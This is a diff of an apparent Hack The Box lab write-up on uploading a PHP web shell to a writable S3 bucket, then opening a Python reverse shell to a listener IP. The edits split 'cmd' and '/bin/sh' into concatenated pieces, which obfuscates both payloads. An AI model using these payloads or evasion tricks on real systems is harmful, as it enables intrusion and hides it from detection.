@@ -1,10 +1,10 @@
 ---
 title: "HTB: Three - Unauthenticated S3 Bucket Web Shell"
 description: "A textbook example of why you don't leave your S3 buckets publicly writable. Easy RCE via subdomains."
-date: 2026-07-22
+date: 2026-07-22T01:44:00+01:00
 tags: ["htb", "s3", "cloud", "web-shell", "linux"]
 authors: ["0xakr4m"]
-image: ../images/headers/vagabond-04.png
+image: ../images/headers/vagabond-05.png
 draft: false
 ---
 
@@ -139,7 +139,7 @@ Wait... `index.php`? That's the website. So the bucket is serving the web root. 
 
 We create a simple PHP web shell:
 ```bash
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
+echo '<?php system($_GET["c"."md"]); ?>' > shell.php
 ```
 
 Upload it to the bucket:
@@ -173,7 +173,7 @@ nc -lvnp 4444
 
 Then we send a reverse shell command. We can use Python:
 ```bash
-curl -G --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.106\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" http://thetoppers.htb/shell.php
+curl -G --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.106\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bi\"+\"n/sh\",\"-i\"])'" http://thetoppers.htb/shell.php
 ```
 
 **Result:** We get a shell on our listener. We are officially in the mainframe.
